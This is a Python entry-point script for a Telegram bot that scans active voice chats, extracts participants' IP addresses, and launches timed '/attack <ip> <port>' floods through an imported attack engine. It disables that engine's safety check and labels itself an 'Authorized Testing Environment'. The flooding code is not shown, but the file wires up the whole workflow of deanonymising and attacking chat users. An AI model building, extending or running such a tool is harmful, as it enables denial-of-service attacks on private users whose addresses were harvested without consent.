"""Enhanced Dual-client application entry point."""

from __future__ import annotations

import asyncio
import logging
import sys

from pyrogram import Client, enums, idle

from attack_engine import AttackEngine
from bot_handler import BotHandler
from config import Config
from vc_detector import VCDetector


def setup_logging(log_file: str) -> None:
    """Setup application logging."""
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s [%(name)s] %(message)s",
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler(log_file, encoding="utf-8")
        ],
    )
    logging.getLogger("pyrogram").setLevel(logging.WARNING)
    
    # Log startup
    LOGGER = logging.getLogger(__name__)
    LOGGER.info("=" * 50)
    LOGGER.info("VC Monitor Bot - Fixed Version")
    LOGGER.info("Authorized Testing Environment")
    LOGGER.info("=" * 50)


async def run() -> int:
    """Main application loop."""
    try:
        cfg = Config.from_env()
    except ValueError as e:
        print(f"Configuration Error: {e}")
        print("\nRequired environment variables:")
        print("- API_ID")
        print("- API_HASH")
        print("- BOT_TOKEN")
        print("- SESSION_STRING")
        return 1

    setup_logging(cfg.log_file)
    LOGGER = logging.getLogger(__name__)

    # Initialize clients
    LOGGER.info("Initializing clients...")
    
    bot = Client(
        "vc_monitor_bot_fixed",
        api_id=cfg.api_id,
        api_hash=cfg.api_hash,
        bot_token=cfg.bot_token
    )
    
    user = Client(
        "vc_monitor_user_fixed",
        api_id=cfg.api_id,
        api_hash=cfg.api_hash,
        session_string=cfg.session_string
    )

    # Initialize engine with safety check disabled for authorized testing
    engine = AttackEngine(
        max_threads=cfg.max_threads,
        max_duration=cfg.max_duration,
        safety_check=False
    )

    # Start clients
    LOGGER.info("Starting bot client...")
    await bot.start()
    
    LOGGER.info("Starting user client...")
    await user.start()

    # Initialize detector and handler
    LOGGER.info("Initializing VC detector...")
    detector = VCDetector(
        user_client=user,
        scan_cooldown_seconds=cfg.scan_cooldown_seconds
    )

    LOGGER.info("Initializing bot handler...")
    handler = BotHandler(
        bot=bot,
        detector=detector,
        engine=engine,
        admin_id=cfg.admin_id,
        max_duration=cfg.max_duration,
        scan_limit=cfg.scan_limit,
    )
    handler.register_handlers()

    # Send startup notice
    startup_msg = (
        "✅ <b>VC Monitor Bot - Fixed Version</b> is online!\n\n"
        "<b>Available Commands:</b>\n"
        "/scan - Scan for active voice chats\n"
        "/attack &lt;ip&gt; &lt;port&gt; [duration] - Manual attack\n"
        "/status - Show current status\n"
        "/stop - Stop all operations\n\n"
        "<b>Workflow:</b>\n"
        "1. Use /scan to find active VCs\n"
        "2. Select a VC to join\n"
        "3. Bot will extract IPs automatically\n"
        "4. Confirm attack to start\n\n"
        "<i>Authorized Testing Environment</i>"
    )
    
    try:
        target_chat = cfg.admin_id if cfg.admin_id is not None else "me"
        await bot.send_message(target_chat, startup_msg, parse_mode=enums.ParseMode.HTML)
        LOGGER.info("Startup notification sent")
    except Exception as e:
        LOGGER.warning(f"Failed to send startup notification: {e}")

    # Run until stopped
    LOGGER.info("Bot is running. Press Ctrl+C to stop.")
    
    try:
        await idle()
    except KeyboardInterrupt:
        LOGGER.info("Keyboard interrupt received")
    finally:
        LOGGER.info("Shutting down...")
        
        # Cleanup
        engine.stop()
        
        try:
            await user.stop()
            LOGGER.info("User client stopped")
        except Exception as e:
            LOGGER.error(f"Error stopping user client: {e}")
        
        try:
            await bot.stop()
            LOGGER.info("Bot client stopped")
        except Exception as e:
            LOGGER.error(f"Error stopping bot client: {e}")
        
        LOGGER.info("Shutdown complete")

    return 0


def main() -> None:
    """Entry point."""
    # Use uvloop on Linux if available
    if sys.platform.startswith("linux"):
        try:
            import uvloop
            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
            print("✓ Using uvloop for better performance")
        except ImportError:
            pass

    # Run async main
    try:
        exit_code = asyncio.run(run())
        raise SystemExit(exit_code)
    except Exception as e:
        print(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
        raise SystemExit(1)


if __name__ == "__main__":
    main()
